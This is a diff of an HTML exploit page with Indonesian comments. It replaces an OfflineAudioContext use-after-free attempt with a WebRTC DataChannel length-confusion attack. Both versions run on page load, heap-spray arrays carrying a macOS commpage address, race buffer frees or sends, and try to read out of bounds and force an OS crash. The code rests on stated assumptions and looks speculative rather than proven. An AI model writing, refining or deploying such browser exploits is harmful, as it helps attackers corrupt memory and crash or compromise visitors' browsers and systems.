@@ -1,7 +1,149 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>OfflineAudioContext UAF (Synchronous Attack) - Log Penuh</title>
+    <title>WebRTC Length Corruption Attack</title>
+</head>
+<body>
+
+    <h1>WebRTC DataChannel Length Confusion (Final Attempt)</h1>
+    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
+    <p id="status">INIT: Mempersiapkan Serangan WebRTC Length Confusion...</p>
+    <div id="log-area"></div>
+
+    <script>
+        // --- KONSTANTA COMM PAGE ---
+        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
+        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
+        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
+        
+        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
+        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
+
+        let startTime = performance.now();
+        let peerA = null;
+        let peerB = null;
+        let dataChannelA = null;
+        let corruptorArray = null; // Array yang akan dirusak
+        let sprayHolders = []; 
+        let attackInterval = null;
+
+        function log(message, type = 'log-info') {
+            const timeElapsed = (performance.now() - startTime).toFixed(2);
+            const logElement = document.getElementById('log-area');
+            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
+            logElement.scrollTop = logElement.scrollHeight;
+        }
+
+        // --- FUNGSI SPRAY PAYLOAD (Mengandung Commpage Address) ---
+        function sprayPayload() {
+            log("Memulai Spraying Payload...", "log-spray");
+            const SPRAY_COUNT = 1500;
+            const PAYLOAD_SIZE = 64; 
+
+            for (let i = 0; i < SPRAY_COUNT; i++) {
+                let payloadArray = new Float64Array(PAYLOAD_SIZE);
+                payloadArray[0] = HIGH_WORD; 
+                payloadArray[1] = LOW_WORD;
+                payloadArray[2] = 2029.0 + i; 
+                sprayHolders.push(payloadArray); 
+            }
+        }
+
+        // --- FUNGSI EKSEKUSI UTAMA ---
+        async function runWebRTCAttack() {
+            startTime = performance.now();
+            log("Phase 1: Membuat Peer dan Array Korban.", "log-init");
+            
+            // Korban: TypedArray yang akan kita tempatkan di dekat buffer DataChannel
+            corruptorArray = new Uint32Array(256); // 1KB
+            corruptorArray.fill(0xAAAAAAAA);
+
+            const config = { iceServers: [] }; 
+            peerA = new RTCPeerConnection(config);
+            peerB = new RTCPeerConnection(config);
+
+            dataChannelA = peerA.createDataChannel("exploit_channel", { maxPacketLifeTime: 1, ordered: false });
+            
+            // ... (Kode ICE Exchange dan Offer/Answer sama seperti sebelumnya) ...
+            const offer = await peerA.createOffer();
+            await peerA.setLocalDescription(offer);
+            await peerB.setRemoteDescription(peerA.localDescription);
+            const answer = await peerB.createAnswer();
+            await peerB.setLocalDescription(answer);
+            await peerA.setRemoteDescription(peerB.localDescription);
+
+            log("Phase 2: Koneksi Peer dibuat.");
+
+            // 3. Memicu Length Corruption Race
+            dataChannelA.onopen = function() {
+                log("Phase 3: DataChannel terbuka. Memulai serangan pengiriman cepat...", "log-critical");
+                
+                // Buffer besar (4KB)
+                const sendBuffer = new ArrayBuffer(4096); 
+                const senderView = new Uint32Array(sendBuffer);
+                
+                let sendCount = 0;
+                const MAX_SENDS = 10; 
+
+                attackInterval = setInterval(() => {
+                    if (dataChannelA.readyState === 'open' && sendCount < MAX_SENDS) {
+                        // 1. Lakukan Spray di tengah pengiriman (untuk menimpa header buffer WebRTC)
+                        sprayPayload(); 
+                        
+                        // 2. Kirim Buffer Kecil (Lebih cepat di WebRTC)
+                        dataChannelA.send(sendBuffer); 
+                        sendCount++;
+                    } else {
+                        clearInterval(attackInterval);
+                        log("Phase 4: Mengakhiri Transaksi & Memicu Trigger...", "log-critical");
+                        
+                        peerA.close();
+                        peerB.close();
+                        
+                        // 3. TRIGGER: Coba akses array korban (yang mungkin ditimpa length-nya)
+                        
+                        // Nilai yang kita inginkan untuk Length Array (Misal: 0xFFFFFFFF)
+                        const OVERFLOW_LENGTH = 0x40000000; 
+
+                        // Kita ASUMSIKAN sprayPayload menimpa length array menjadi OVERFLOW_LENGTH
+                        
+                        try {
+                            log(`Membaca OOB pada index: ${corruptorArray.length + 5}`, "log-critical");
+
+                            // Jika length berhasil ditimpa, kita dapat membaca OOB
+                            // Coba baca di lokasi OOB yang seharusnya kini berisi Commpage Payload
+                            const OOB_INDEX = corruptorArray.length + 5; 
+                            const crashValue = corruptorArray[OOB_INDEX];
+                            
+                            log(`Nilai OOB dibaca: 0x${crashValue.toString(16)}`, "log-critical");
+
+                            // Jika sukses, crash akan terjadi di sini
+                            if (crashValue === LOW_WORD) {
+                                log("SUCCESS: Length Corruption dan OOB Read Berhasil!", "log-success");
+                            }
+
+                            // Trigger Final (Jika OOB Read berhasil)
+                            let finalArray = new Array(crashValue);
+                            finalArray.fill(1); // Memaksa alokasi dengan panjang Commpage
+
+                        } catch(e) {
+                            log(`JS Exception: ${e.message} - Menunggu Crash OS.`, "log-critical");
+                        }
+                    }
+                }, 5); 
+            };
+        }
+        
+        document.addEventListener('DOMContentLoaded', () => {
+             if (!window.RTCPeerConnection) {
+                 document.getElementById('status').textContent = 'Gagal: WebRTC tidak didukung.';
+                 return;
+             }
+             document.getElementById('status').textContent = 'Memulai rangkaian WebRTC Length Confusion...';
+             setTimeout(runWebRTCAttack, 50);
+             document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Length Corruption.';
+        });
+    </script>
     <style>
         #log-area {
             border: 1px solid #ccc;
@@ -19,135 +161,5 @@
         .log-critical { color: red; font-weight: bold; }
         .log-success { color: green; font-weight: bold; }
     </style>
-</head>
-<body>
-
-    <h1>OfflineAudioContext UAF (Sinkron Agresif)</h1>
-    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status" class="log-init">INIT: Mempersiapkan Audio Context Sinkron...</p>
-    <div id="log-area"></div>
-
-    <script>
-        // --- KONSTANTA COMM PAGE ---
-        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
-        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
-        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
-        
-        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
-        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
-
-        let startTime = performance.now();
-        let offlineCtx = null;
-        let victimNode = null;
-        let payloadHolders = []; 
-
-        // --- FUNGSI LOGGING DENGAN TIMESTAMP ---
-        function log(message, type = 'log-info') {
-            const timeElapsed = (performance.now() - startTime).toFixed(2);
-            const logElement = document.getElementById('log-area');
-            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
-            logElement.scrollTop = logElement.scrollHeight;
-        }
-        
-        // --- FUNGSI HEAP SPRAY PAYLOAD ---
-        function sprayPayload() {
-            log("Memulai Spraying Payload...", "log-spray");
-            const SPRAY_COUNT = 1500;
-            const PAYLOAD_SIZE = 64; 
-
-            for (let i = 0; i < SPRAY_COUNT; i++) {
-                let payloadArray = new Float64Array(PAYLOAD_SIZE);
-                payloadArray[0] = HIGH_WORD; 
-                payloadArray[1] = LOW_WORD;
-                payloadArray[2] = 2028.0 + i; 
-                payloadHolders.push(payloadArray); 
-            }
-            log(`Spray selesai. ${SPRAY_COUNT} Array dialokasikan.`, "log-spray");
-        }
-
-        // --- Trigger Alternatif (Dipanggil jika Render selesai tanpa crash) ---
-        function triggerAlternativeCrash() {
-             log("Memicu Trigger Alternatif...", "log-critical");
-             
-             // 1. Coba alokasi objek Web Audio yang sama
-             let attackerCtx = new (window.AudioContext || window.webkitAudioContext)();
-             let attackerBuffer = attackerCtx.createBuffer(1, 44100, 44100); 
-             let attackerView = attackerBuffer.getChannelData(0);
-             
-             try {
-                 // 2. Akses memori di alamat awal buffer yang sekarang mungkin berisi pointer rusak
-                 let crashPtr = attackerView[0]; 
-                 
-                 log(`Membaca memori: 0x${crashPtr.toString(16)}`, "log-critical");
-
-                 if (crashPtr.toFixed(0) === LOW_WORD.toString()) {
-                     log("SUCCESS: Alamat Commpage Ditemukan di Pointer AudioBuffer!", "log-success");
-                 }
-                 
-                 // 3. FORCE CRASH: Gunakan nilai pointer yang didapat
-                 let crashNode = attackerCtx.createOscillator();
-                 crashNode.frequency.value = crashPtr; 
-
-             } catch(e) {
-                 log(`JS Exception Terdeteksi: ${e.message}`, "log-critical");
-                 document.getElementById('status').className = 'log-critical';
-                 document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Menunggu Crash OS (EXC_BAD_ACCESS).';
-             }
-        }
-
-        // --- FUNGSI UTAMA ATTACK ---
-        function runOfflineAttack() {
-            startTime = performance.now();
-            log("Phase 1: Membuat OfflineAudioContext.", "log-init");
-            
-            try {
-                offlineCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100 * 1, 44100); 
-            } catch(e) {
-                log(`ERROR: OfflineAudioContext gagal: ${e.message}`, "log-critical");
-                return;
-            }
-
-            // 2. Alokasi Korban
-            let buffer = offlineCtx.createBuffer(1, 44100, 44100);
-            victimNode = offlineCtx.createBufferSource();
-            victimNode.buffer = buffer;
-            victimNode.connect(offlineCtx.destination);
-            victimNode.start(0);
-
-            log("Phase 2: Node Korban dibuat dan terhubung.", "log-info");
-
-            // 3. FREE DAN SPRAY SINKRON AGRESIIF
-            log("Phase 3: Memicu FREE dan SPRAY SINKRON...", "log-critical");
-            
-            // FREE:
-            victimNode.disconnect(); 
-            victimNode = null; 
-            buffer = null;
-            log("Node dan Buffer Referensi Dihapus.", "log-info");
-            
-            // SPRAY: Tepat setelah FREE (Hampir sinkron)
-            sprayPayload(); 
-            
-            // 4. Memicu Trigger Cleanup/Dereference
-            log("Phase 5: Memulai Render Sinkron...", "log-info");
-            
-            // Panggil render. Ini adalah titik trigger utama.
-            offlineCtx.startRendering().then(() => {
-                log("Render Selesai. Tidak ada crash di Audio Thread.", "log-info");
-                triggerAlternativeCrash();
-            }).catch(e => {
-                log(`Render GAGAL (Potensi UAF/Corrupt): ${e.message}`, "log-critical");
-                triggerAlternativeCrash();
-            });
-
-        }
-        
-        document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian OfflineAudioContext...';
-            setTimeout(runOfflineAttack, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah FREE-SPRAY Sinkron.';
-        });
-
-    </script>
 </body>
 </html>
